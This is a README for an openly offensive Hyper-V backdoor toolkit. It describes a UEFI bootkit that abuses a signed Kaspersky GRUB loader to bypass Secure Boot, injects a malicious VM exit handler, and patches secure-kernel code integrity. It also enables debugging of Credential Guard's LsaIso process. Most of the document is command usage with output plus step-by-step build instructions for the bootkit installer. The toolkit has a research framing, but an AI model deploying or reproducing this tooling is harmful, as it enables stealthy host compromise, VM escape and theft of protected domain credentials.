
# Hyper-V backdoor

## General information

This repository contains Hyper-V backdoor that might be useful for reverse engineering and exploit development purposes, it [provides an interface](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/python/payloads/DmaBackdoorHv/backdoor_client/backdoor_library/backdoor_library.cpp) for inspecting of hypervisor state (VMCS, physical/virtual memory, registers, etc.) from guest partition and perform the guest to host VM escape attacks. 

To deploy thee backdoor you can use [DMA attack toolkit](https://github.com/Cr4sh/s6_pcie_microblaze) or UEFI bootkit based on [signed insecure bootloader](https://support.microsoft.com/en-us/help/4524244/security-update-for-windows-10-february-11-2020) from Kaspersky products which [was discovered](https://habr.com/en/post/446238/) by [@ValdikSS](https://twitter.com/valdikss).


## Contents

* `src/DmaBackdoorHv.c` &minus; UEFI DXE driver that hooks Windows Loader and patching Hyper-V executable image on the fly in order to inject malicious VM exit handler. 

* `src/HyperV.c` &minus; Malicious VM exit handler code that implements Hyper-V backdoor functionality.

* `backdoor_client/backdoor_client.h` &minus; Hyper-V backdoor program interface.

* `backdoor_client/backdoor_library` &minus; Static library that implements backdoor client functionality.

* `backdoor_client/backdoor_library.h` &minus; Hyper-V backdoor client library program interface.

* `backdoor_client/backdoor_client` &minus; Command line application that interracts with the backdoor using client library.

* `backdoor_client/trustlet_loader` &minus; Command line application to run 3-rd party VTL1 trustlets using Hyper-V backdoor.

* `backdoor_client/trustlet_demo` &minus; 3-rd party VTL1 trustlet project that provides an example of communication between normal world and secure world.

* `bootkit_installer.ps1` &minus; Program to deploy Hyper-V backdoor as bootkit along with the signed Kaspersky bootloader used for Secure Boot bypass.

* `resources` &minus; 3-rd party binaries used to build `bootkit_installer.ps1` program (see "building from the source code" section for more details).

* `grub-2.02_chainloader.patch` &minus; GRUB2 patch used to compile malicious chain-loader module needed for Secure Boot bypass with the help of the signed Kaspersky bootloader.


## Deploying the backdoor

[Windows Virtualization-based Security (VBS)](https://docs.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-vbs) uses hardware virtualization features and Hyper-V to host a number of security solutions, providing them with greatly increased protection from vulnerabilities in the operating system, and preventing the use of malicious exploits which attempt to defeat protections. One of the examples of such services is [Hypervisor-Enforced Code Integrity](https://docs.microsoft.com/en-us/windows/security/threat-protection/device-guard/enable-virtualization-based-protection-of-code-integrity) which uses VBS to significantly strengthen code integrity policy enforcement.

Another example of VSB based security feature is [Windows Credential Guard](https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard). Hyper-V functionality is employed to logically divide the system into two separate "worlds": the normal world (VTL0) running the NT kernel that we’re all familiar with and a separate secure world (VTL1) running a Secure Kernel (SK). Enabled Credential Guard causes the LSA process (LSASS) to remain in the Host OS running in the normal world, and a special, additional instance of LSA (called LSAIso – which stands for LSA Isolated) to remain as trustlet running in the secure world. Because isolated LSAIso trustlet is responsible for protecting domain credentials, attacker who managed to gain Administrator privileges within normal world are not able to use [Mimikatz](https://github.com/gentilkiwi/mimikatz) like tools anymore to steal the credentials from memory.

Virtualization-based Security is relying on UEFI Secure Boot enabled, so, to load Hyper-V backdoor on VBS enabled machines we should not to disrupt the Secure Boot configuration. One of the possible ways to do that is injecting Hyper-V backdoor using pre-boot DMA attack which was described in [DMA attack toolkit](https://github.com/Cr4sh/s6_pcie_microblaze) documentation. Another possible way is to use signed 3-rd party bootloader as part of the secure boot chain which functionality can be abused to load Hyper-V backdoor UEFI DXE driver whithout valid digital sugnature just before the passing execution to the legitimate Windows Boot Manager. 

Luckily, such digitally signed 3-rd party bootloader can be taken form [Kaspersky Rescue Disk 18](https://support.kaspersky.com/viruses/krd18). This bootloader is actually just [GRUB 2.02](https://www.gnu.org/software/grub/index.html) that was compiled without disabling some dangerous built-in commands like `rmmod` and `insmod`. This commands can be used by attacker to load malicious [GRUB chain-loader](https://www.gnu.org/software/grub/manual/grub/html_node/Chain_002dloading.html) module and effectively bypass UEFI Secure Boot.

<img src="https://raw.githubusercontent.com/Cr4sh/s6_pcie_microblaze/master/docs/images/backdoor_boot_flow.png" width="843" height="406">

To install Hyper-V backdoor along with the Kaspersky bootloader thatere's a program called `bootkit_installer.ps1` that embeds all the needed executables. Use `-Install` command line key to install Hyper-V backdoor as bootkit or `-Uninstall` to revert original boot chain.

<img src="https://raw.githubusercontent.com/Cr4sh/s6_pcie_microblaze/master/docs/images/backdoor_bootkit.png" width="710" height="420">


## Usage

Client program `backdoor_client.exe` is used to interact with the backdoor from Hyper-V guest or host partition. 

Check if backdoor is loaded:

```
> .\backdoor_client.exe 0
[+] Running on CPU #0
[+] VM exit backdoor is present

      Hypervisor CR0: 0x80010031
      Hypervisor CR3: 0x7aa000
      Hypervisor CR4: 0x42260
 Hypervisor IDT base: 0xfffff80005c78040 (limit = 0xffff)
  Hypervisor GS base: 0xfffff80005c7b000
     VM exit handler: 0xfffff8000588c410
       VM exit count: 0xeecbec

Press any key to quit...
```

Obtaining backdoor UEFI DXE driver debug messages that was stored in the special UEFI runtime memory region (useful for troubleshooting):

```
> .\backdoor_client.exe --debug
[+] Reading firmware variable DmaBackdoorInfo {4c52678d-4851-4501-9a14-29a9ae18f057}
[+] Loading WinIo driver...
[+] WinIo driver was loaded
[+] Reading DXE driver debug messages from 0x8af44000

DmaBackdoorHv.c(723) : ******************************
DmaBackdoorHv.c(724) :
DmaBackdoorHv.c(725) :   Hyper-V backdoor loaded!
DmaBackdoorHv.c(726) :
DmaBackdoorHv.c(727) : ******************************
DmaBackdoorHv.c(760) : Image address is 0x865eb000
DmaBackdoorHv.c(254) : BackdoorImageRealocate(): image size = 0x2c20
DmaBackdoorHv.c(770) : Resident code base address is 0x8af41000
DmaBackdoorHv.c(605) : Protocol notify handler is at 0x8af41364
DmaBackdoorHv.c(630) : BackdoorEntryResident()
DmaBackdoorHv.c(641) : OpenProtocol() hook was set, handler = 0x8af42ff7
DmaBackdoorHv.c(646) : ExitBootServices() hook was set, handler = 0x8af43007
DmaBackdoorHv.c(418) : winload.dll is at 0x830000
DmaBackdoorHv.c(425) : winload!BlLdrLoadImage() is at 0x8c695c
DmaBackdoorHv.c(456) : 791 free bytes found at the end of the code section at 0x98cce9
DmaBackdoorHv.c(506) : winload!BlLdrLoadImage() hook was set, handler is at 0x8af414cc
DmaBackdoorHv.c(329) : new_BlLdrLoadImage(): "\Windows\system32\mcupdate_GenuineIntel.dll"
DmaBackdoorHv.c(329) : new_BlLdrLoadImage(): "\Windows\system32\hvix64.exe"
HyperV.c(369) : HyperVHook(): Hyper-V image is at 0xfffff80058245000
HyperV.c(388) : HyperVHook(): Resources section RVA is 0x1400000 (0x200000 bytes)
HyperV.c(425) : HyperVHook(): Code section RVA is 0x200000
HyperV.c(572) : HyperVHook(): Hyper-V VM exit handler is at 0xfffff80058475d10
HyperV.c(573) : HyperVHook(): Backdoor code size is 684 bytes
DmaBackdoorHv.c(329) : new_BlLdrLoadImage(): "\Windows\system32\kdstub.dll"
DmaBackdoorHv.c(329) : new_BlLdrLoadImage(): "\Windows\system32\hv.exe"
DmaBackdoorHv.c(540) : new_ExitBootServices() called
```

Dumping VMCS structure of the current guest:

```
> backdoor_client.exe 0 --vmcs
[+] Running on CPU #0
[+] VMCS dump:

             GUEST_ES_SELECTOR: 0x2b
             GUEST_CS_SELECTOR: 0x33
             GUEST_SS_SELECTOR: 0x2b
             GUEST_DS_SELECTOR: 0x2b
             GUEST_FS_SELECTOR: 0x53
             GUEST_GS_SELECTOR: 0x2b
           GUEST_LDTR_SELECTOR: 0x0
             GUEST_TR_SELECTOR: 0x40
              HOST_ES_SELECTOR: 0x20
              HOST_CS_SELECTOR: 0x10
              HOST_SS_SELECTOR: 0x20
              HOST_DS_SELECTOR: 0x20
              HOST_FS_SELECTOR: 0x20
              HOST_GS_SELECTOR: 0x20
              HOST_TR_SELECTOR: 0x30
                   IO_BITMAP_A: 0x7a3000
              IO_BITMAP_A_HIGH: 0x0
                   IO_BITMAP_B: 0x7a4000
              IO_BITMAP_B_HIGH: 0x0
                  GUEST_PDPTE0: 0x20000000000
                  GUEST_PDPTE1: 0x60000010000
                  GUEST_PDPTE2: 0x40000000000
                  GUEST_PDPTE3: 0x0
                   EPT_POINTER: 0x145f101e

  ...

```

Dumping hypervisor IDT handlers:

```
> .\backdoor_client.exe 0 --idt
[+] Running on CPU #0
[+] Hypervisor IDT dump:

0000: 0xfffff80004250440
0001: 0xfffff800042504c0
0002: 0xfffff80004250540
0003: 0xfffff80004250880
0004: 0xfffff80004250780
0005: 0xfffff80004250800
0006: 0xfffff80004250900
0007: 0xfffff80004250a00
0008: 0xfffff80004251000
0009: 0xfffff80004250f80
000a: 0xfffff80004251080

...

```

Enumerate running guests:

```
> .\backdoor_client.exe 0 --ept-list
[+] Running on CPU #0
[+] Collecting EPT address list...
[+] Reading collected data from 0x2810...

  #00: VPID = 0x0001, EPT = 0x00000000145f101e
  #01: VPID = 0x0002, EPT = 0x00000000145e601e
  #02: VPID = 0x028d, EPT = 0x000000012800301e
  #03: VPID = 0x0001, EPT = 0x00000000145ed01e
```

Reading physical memory:

```
> .\backdoor_client.exe 0 --phys-read 0x2000 0x100
[+] Running on CPU #0
[+] Reading 0x100 bytes of physical memory at 0x2000
0000000000002000: eb 76 00 00 3f 00 10 20  00 00 00 00 00 00 00 00  | .v..?.. ........
0000000000002010: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  | ................
0000000000002020: 00 00 00 00 00 9b 20 00  00 00 00 00 00 00 00 00  | ...... .........
0000000000002030: ff ff 00 00 00 93 cf 00  00 00 00 00 00 00 00 00  | ................
0000000000002040: ff ff 00 00 00 9b cf 00  00 00 00 00 00 00 00 00  | ................
0000000000002050: cb 20 00 00 30 00 fd 20  00 00 10 00 00 00 00 00  | . ..0.. ........
0000000000002060: 60 d5 8a 05 00 f8 ff ff  00 a0 7a 00 00 00 00 00  | `.........z.....
0000000000002070: 04 00 00 00 01 00 00 00  fa 66 2b c0 8c c8 8e d8  | .........f+.....
0000000000002080: 66 be 70 00 00 00 67 66  c7 06 01 00 00 00 66 c1  | f.p...gf......f.
0000000000002090: e0 04 66 8b f8 66 67 0f  01 15 04 00 00 00 0f 20  | ..f..fg........
00000000000020a0: c0 66 83 c8 11 0f 22 c0  67 f6 05 74 00 00 00 01  | .f....".g..t....
00000000000020b0: 74 0f 66 b9 a0 01 00 00  0f 32 66 0f ba f2 22 0f  | t.f......2f...".
00000000000020c0: 30 b8 20 00 8e d8 66 67  ff 6f 50 c7 47 70 02 00  | 0. ...fg.oP.Gp..
00000000000020d0: 00 00 0f 20 e0 83 c8 20  0f 22 e0 8b 47 68 0f 22  | ... ... ."..Gh."
00000000000020e0: d8 b9 80 00 00 c0 0f 32  0d 00 01 00 00 0f 30 0f  | .......2......0.
00000000000020f0: 20 c0 0d 00 00 00 80 0f  22 c0 ff 6f 56 8b ff 48  |  ......."..oV..H
```

Translating guest physical address to host physical address:

```
> .\backdoor_client.exe 0 --phys-translate 0x145f1000 0x1d4bf0000
[+] Running on CPU #0
backdoor_phys_translate(): EPT PML4 is at 0x145f1000, VA is 0x1d4bf0000
EPT PML4E 0x145f1000[0x0]: 0x145f9007
EPT PDPTE 0x145f9000[0x7]: 0x150bf007
  EPT PDE 0x150bf000[0xa5]: 0x1d4a000b7

0x00000001d4bf0000 -> 0x00000001d4bf0000
```

Translating guest virtual address to host physical address:

```
> .\backdoor_client.exe 0 --virt-translate 0x1ab000 0xfffff8017d1d5000 0x145f1000
[+] Running on CPU #0
backdoor_virt_translate(): PML4 is at 0x1ab000, VA is 0xfffff8017d1d5000
backdoor_phys_translate(): EPT PML4 is at 0x145f1000, VA is 0x1abf80
EPT PML4E 0x145f1000[0x0]: 0x145f9007
EPT PDPTE 0x145f9000[0x0]: 0x14612007
  EPT PDE 0x14612000[0x0]: 0x212b4007
  EPT PTE 0x212b4000[0x1ab]: 0x85900000001ab037
PML4E 0x1ab000[0x1f0]: 0x1344063
backdoor_phys_translate(): EPT PML4 is at 0x145f1000, VA is 0x1344028
EPT PML4E 0x145f1000[0x0]: 0x145f9007
EPT PDPTE 0x145f9000[0x0]: 0x14612007
  EPT PDE 0x14612000[0x9]: 0x212a3007
  EPT PTE 0x212a3000[0x144]: 0x8590000001344037
PDPTE 0x1344000[0x5]: 0x1345063
backdoor_phys_translate(): EPT PML4 is at 0x145f1000, VA is 0x1345f40
EPT PML4E 0x145f1000[0x0]: 0x145f9007
EPT PDPTE 0x145f9000[0x0]: 0x14612007
  EPT PDE 0x14612000[0x9]: 0x212a3007
  EPT PTE 0x212a3000[0x145]: 0x8590000001345037
  PDE 0x1345000[0x1e8]: 0x1395063
backdoor_phys_translate(): EPT PML4 is at 0x145f1000, VA is 0x1395ea8
EPT PML4E 0x145f1000[0x0]: 0x145f9007
EPT PDPTE 0x145f9000[0x0]: 0x14612007
  EPT PDE 0x14612000[0x9]: 0x212a3007
  EPT PTE 0x212a3000[0x195]: 0x8590000001395037
  PTE 0x1395000[0x1d5]: 0x80000000033d5963
backdoor_phys_translate(): EPT PML4 is at 0x145f1000, VA is 0x33d5000
EPT PML4E 0x145f1000[0x0]: 0x145f9007
EPT PDPTE 0x145f9000[0x0]: 0x14612007
  EPT PDE 0x14612000[0x19]: 0x21283007
  EPT PTE 0x21283000[0x1d5]: 0x85900000033d5037

0xfffff8017d1d5000 -> 0x00000000033d5000
```

Also, `backdoor_client.exe` can inject dummy driver located in `payloads/DmaBackdoorHv/backdoor_driver.sys` from guest Hyper-V partition to host Hyper-V partition:

<img src="https://raw.githubusercontent.com/Cr4sh/s6_pcie_microblaze/master/docs/images/backdoor_vm_inject.png" width="749" height="498">

Show basic information about secure kernel running in VTL1:

```
> .\backdoor_client.exe 0 --sk-info
[+] Running on CPU #0
[+] Collecting secure kernel information...
[+] Reading collected data from 0xfffff833df600d80...
[+] Running secure kernel detected, 15 VTL1 calls were made
[+] Secure kernel IDT vector #0 is at 0xfffff800582d7400

 securekernel.exe base: 0xfffff80058295000
         skci.dll base: 0xfffff8005838a000
                   CR3: 0x6400000
           EPT address: 0x000000011cb2f01e
              IDT base: 0xfffff80058324970
              GDT base: 0xffff9880100448b8

```

Show list of the running VTL1 trustlets:

```
> .\backdoor_client.exe 0 --sk-ps
[+] Running on CPU #0
[+] Collecting secure kernel information...
[+] Reading collected data from 0xfffff833df600d80...
[+] Running secure kernel detected, 19 VTL1 calls were made
[+] Secure kernel EPT is at 0x000000011cb2f01e
[+] Secure kernel IDT vector #0 is at 0xfffff800582d7400
[+] securekernel.exe is at 0xfffff80058295000
[+] securekernel.exe image size is 0xf4000 bytes
[+] Secure kernel build number is 10011
[+] securekernel!SkpspProcessList is at 0xfffff8005835b820

 SKPROCESS at 0xffff988010191740 "LsaIso.exe"

       flags: 0xa3
         PID: 792
         CR3: 0x869211000
      policy: 0x00007ff6481a3470

    ImagePolicyIdEtw = 0x1
    ImagePolicyIdDebug = 0x0
    ImagePolicyIdCrashDump = 0x1
    ImagePolicyIdCrashDumpKeyGuid = 0x7ff6481a3000
    ImagePolicyIdCrashDumpKey = 0x7ff6481a3030

 SKPROCESS at 0xffff9880101b3140 "trustlet_demo.exe"

       flags: 0x83
         PID: 7616
         CR3: 0x8693ac000
      policy: 0x00007ff67ad6a030

    ImagePolicyIdEtw = 0x0
    ImagePolicyIdDebug = 0x1
    ImagePolicyIdCrashDump = 0x0
    ImagePolicyIdScenarioId = 0x7ff67ad6a000

```

On the example above you can see `LSAIso` trustlet process that belongs to the Windows Credential Guard and demo trustlet that was loaded using the Hyper-V backdoor. In order to execute the trustlet in the secure world Microsoft introduced `CREATE_SECURE_PROCESS` flag of `CreateProcess` [API function](https://docs.microsoft.com/en-us/windows/win32/procthread/process-creation-flags). Trustlet executable must have valid Microsoft digital signature with the Windows System Component Verification (1.3.6.1.4.311.10.3.6) Enhanced Key Usage property. To bypass this requirement I made `trustlet_loader.exe` tool that utilizes Hyper-V backdoor functionality to perform in-memory patching of `skci.dll` image responsible for VTL1 code integrity used by Secure Kernel.

Example of loading 3-rd party VTL1 trustlet:

```
> .\trustlet_loader.exe .\trustlet_demo.exe --test-demo
[+] Hyper-V backdoor is running
[+] Collecting secure kernel information...
[+] Reading collected data from 0xfffff833df600d80...
[+] Secure kernel IDT vector #0 is at 0xfffff800582d7400
[+] securekernel.exe is at 0xfffff80058295000
[+] skci.dll is at 0xfffff8005838a000 (phys: 0x612d000)
[+] skci.dll image size is 0x4e000 bytes
[+] skci!SkciFinishImageValidation() RVA is 0x20f0
[+] 17 functions, 164 basic blocks and 1795 instructions was disassembled
Patching location at address skci+3ca98 (phys: 0x6169a98)
Patching location at address skci+3cb9d (phys: 0x6169b9d)
Patching location at address skci+3cce1 (phys: 0x6169ce1)
Patching location at address skci+3cda6 (phys: 0x6169da6)
Patching location at address skci+3ceac (phys: 0x6169eac)
Patching location at address skci+40227 (phys: 0x616d227)
Patching location at address skci+4022e (phys: 0x616d22e)
[+] 7 instructions was patched
[+] Trustlet executable path is ".\trustlet_demo.exe"
[+] Secure process 8628 started
Patching location at address skci+3ca98 (phys: 0x6169a98)
Patching location at address skci+3cb9d (phys: 0x6169b9d)
Patching location at address skci+3cce1 (phys: 0x6169ce1)
Patching location at address skci+3cda6 (phys: 0x6169da6)
Patching location at address skci+3ceac (phys: 0x6169eac)
Patching location at address skci+40227 (phys: 0x616d227)
Patching location at address skci+4022e (phys: 0x616d22e)
[+] 7 instructions was restored
[+] Creating RPC binding...
[+] Calling RPC server to obtain trustlet identy key...
[+] Trustlet identy key size is 299 bytes
00000000: 2b 01 00 00 01 00 00 00  23 01 00 00 00 00 00 00  | +.......#.......
00000010: 52 53 41 31 00 08 00 00  03 00 00 00 00 01 00 00  | RSA1............
00000020: 00 00 00 00 00 00 00 00  01 00 01 dd 3c 73 1a 18  | ............<s..
00000030: 48 89 d8 a0 9d ed 1c bc  eb 3e ea e5 de 98 f3 da  | H........>......
00000040: a9 02 0c d5 5e 42 c0 68  9b 1a 4e 1e 21 91 c0 1a  | ....^B.h..N.!...
00000050: 98 72 c4 0d e7 41 90 f6  3c fd fd c4 49 02 f5 22  | .r...A..<...I.."
00000060: c5 11 59 de 7d aa f3 d2  25 7c a1 1b da d5 c6 33  | ..Y.}...%|.....3
00000070: 21 5c 4a c5 58 36 6e f1  82 93 a3 35 d8 d2 4f 21  | !\J.X6n....5..O!
00000080: 97 77 98 8b 2c 5c 51 7a  b0 a6 48 29 f8 28 23 18  | .w..,\Qz..H).(#.
00000090: 6c 70 79 a1 11 d5 c3 92  d5 96 26 0c 70 4b e9 7d  | lpy.......&.pK.}
000000a0: 9b f8 9d a0 0b 61 56 24  a3 f8 79 54 c9 0b f4 b0  | .....aV$..yT....
000000b0: db 4b 4f fd 62 5f 0a 38  da 8b 27 68 bc cd d8 fe  | .KO.b_.8..'h....
000000c0: 49 a6 1e d1 04 9d 87 53  6a e7 20 1b a1 f2 39 70  | I......Sj. ...9p
000000d0: fc 40 12 47 be a3 09 20  31 8c ac 1a 84 8a 59 a4  | .@.G... 1.....Y.
000000e0: 61 61 4b f9 63 ea 2a 8e  4f a2 19 ae a0 ca 44 31  | aaK.c.*.O.....D1
000000f0: a8 13 c7 3a 99 d1 13 14  9b 64 ea 32 10 9f 45 6b  | ...:.....d.2..Ek
00000100: d7 19 74 18 91 24 18 9d  65 fd 8c 3d 51 66 fa 30  | ..t..$..e..=Qf.0
00000110: 40 99 ad 46 db e4 cd 45  f2 a3 e0 15 8c ce 31 18  | @..F...E......1.
00000120: fd 59 a0 41 6c b9 24 9d  32 9e 27                 | .Y.Al.$.2.'
[+] Calling RPC server to terminate running trustlet...
[+] Secure process exit code is 0x00000000
[+] Done
```

Trustlet executable image also contains the structure called [Image Policy Metadata](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_image_policy_metadata) that dascribes its capabilities. Among various interesting things it has `ImagePolicyIdDebug` property, it tells the Secure Kernel if it's possible to attach debugger to the trustlet process or not.

From the example above you can see that `LSAIso` trustlet has `ImagePolicyIdDebug` set to zero, it prevents the attacker from attaching debugger to this process and compromising its memory contents:

```
> C:\Debuggers\x64\cdb.exe -pn LsaIso.exe

Microsoft (R) Windows Debugger Version 10.0.18362.1 AMD64
Copyright (c) Microsoft Corporation. All rights reserved.

Cannot debug pid 792, NTSTATUS 0xC0000022
    "{Access Denied}  A process has requested access to an object, but has not been granted those access rights."
Debuggee initialization failed, NTSTATUS 0xC0000022
{Access Denied}  A process has requested access to an object, but has not been granted those access rights.
```

Hyper-V backdoor client allows to patch `ImagePolicyIdDebug` property of specified trustlet process to allow its debugging:

```
> .\backdoor_client.exe 0 --sk-debug-enable 792
[+] Running on CPU #0
[+] Collecting secure kernel information...
[+] Reading collected data from 0xfffff833df600d80...
[+] Running secure kernel detected, 6 VTL1 calls were made
[+] Secure kernel IDT vector #0 is at 0xfffff800582d7400
[+] securekernel.exe is at 0xfffff80058295000
[+] securekernel.exe image size is 0xf4000 bytes
[+] Secure kernel build number is 10011
[+] securekernel!SkpspProcessList is at 0xfffff8005835b820
[+] SKPROCESS for PID 792 is at 0xffff988010191740
[+] Image policy is at 0x7ff6481a3470
[+] ImagePolicyIdDebug found, current value is 0
[+] Image policy was successfully patched

> C:\Debuggers\x64\cdb.exe -pn LsaIso.exe

Microsoft (R) Windows Debugger Version 10.0.18362.1 AMD64
Copyright (c) Microsoft Corporation. All rights reserved.

*** wait with pending attach
Symbol search path is: srv*
Executable search path is:
ModLoad: 00007ff6`48160000 00007ff6`481a6000   C:\Windows\system32\lsaiso.exe
ModLoad: 00007fff`0b040000 00007fff`0b230000   C:\Windows\SYSTEM32\ntdll.dll
ModLoad: 00007fff`0ab10000 00007fff`0abc2000   C:\Windows\SYSTEM32\KERNEL32.DLL
ModLoad: 00007fff`081b0000 00007fff`08453000   C:\Windows\SYSTEM32\KERNELBASE.dll
ModLoad: 00007fff`0ad70000 00007fff`0ae0e000   C:\Windows\system32\msvcrt.dll
ModLoad: 00007fff`07990000 00007fff`079a2000   C:\Windows\system32\iumcrypt.dll
ModLoad: 00007fff`099e0000 00007fff`09a77000   C:\Windows\SYSTEM32\sechost.dll
ModLoad: 00007fff`07960000 00007fff`07988000   C:\Windows\system32\KerbClientShared.dll
ModLoad: 00007fff`07950000 00007fff`0795d000   C:\Windows\system32\NtlmShared.dll
ModLoad: 00007fff`07fb0000 00007fff`07fc2000   C:\Windows\system32\MSASN1.dll
ModLoad: 00007fff`07940000 00007fff`07948000   C:\Windows\system32\IUMBASE.dll
ModLoad: 00007fff`0a4d0000 00007fff`0a5f0000   C:\Windows\system32\RPCRT4.dll
ModLoad: 00007fff`08820000 00007fff`08846000   C:\Windows\system32\bcrypt.dll
ModLoad: 00007fff`07920000 00007fff`07934000   C:\Windows\system32\cryptdll.dll
ModLoad: 00007fff`08510000 00007fff`08527000   C:\Windows\system32\CRYPTSP.dll
ModLoad: 00007fff`07fd0000 00007fff`080ca000   C:\Windows\SYSTEM32\ucrtbase.dll
ModLoad: 00007fff`0a2e0000 00007fff`0a34f000   C:\Windows\system32\WS2_32.dll
ModLoad: 00007fff`07910000 00007fff`07917000   C:\Windows\SYSTEM32\IUMDLL.dll
ModLoad: 00007fff`08130000 00007fff`081b0000   C:\Windows\System32\bcryptprimitives.dll
ModLoad: 00007fff`07900000 00007fff`0790c000   C:\Windows\system32\CRYPTBASE.dll
(318.aa8): Break instruction exception - code 80000003 (first chance)
ntdll!DbgBreakPoint:
00007fff`0b0dfad0 cc              int     3
0:002>
```

## Building from the source code

1. Copy `payloads` subdirectory into the [EDK2](https://github.com/tianocore/edk2) source code directory.

2. Edit EDK2 `Conf/target.txt` file and set `ACTIVE_PLATFORM` value to `OvmfPkg/OvmfPkgX64.dsc`.

3. Edit EDK2 `OvmfPkg/OvmfPkgX64.dsc` and add `payloads/DmaBackdoorHv/DmaBackdoorHv.inf` line at the end of the file.

4. Run Visual Studio Command Prompt and cd to the EDK2 directory.

5. Run `Execute Edk2Setup.bat --pull` to configure build environment and download required binaries.

6. Run `cd payloads/DmaBackdoorHv && nmake` to build DXE driver.

7. Run `nmake orom` to generate UEFI option ROM.

8. Run `nmake chainloader` to download GRUB2, apply `grub-2.02_chainloader.patch` and build chain-loader module.

9. Run `nmake installer` to generate `bootkit_installer.ps1` program.

